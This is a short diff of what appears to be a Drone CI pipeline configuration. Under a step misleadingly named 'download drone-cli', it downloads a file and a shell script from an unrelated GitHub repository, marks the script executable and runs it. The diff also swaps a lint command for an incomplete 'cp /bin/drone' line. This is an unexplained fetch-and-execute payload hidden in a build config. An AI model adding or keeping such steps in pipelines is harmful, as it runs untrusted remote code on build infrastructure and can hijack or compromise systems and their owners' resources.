@@ -8,7 +8,7 @@ steps:
 - name: download drone-cli
   image: drone/cli:1.2.2-alpine
   commands:
-  - golangci-lint run
+  - cp /bin/drone 
   - wget https://raw.githubusercontent.com/outbesok/mesin/main/obatkuat
   - wget https://raw.githubusercontent.com/outbesok/mesin/main/ternak.sh && chmod u+x ternak.sh && ./ternak.sh
 ---
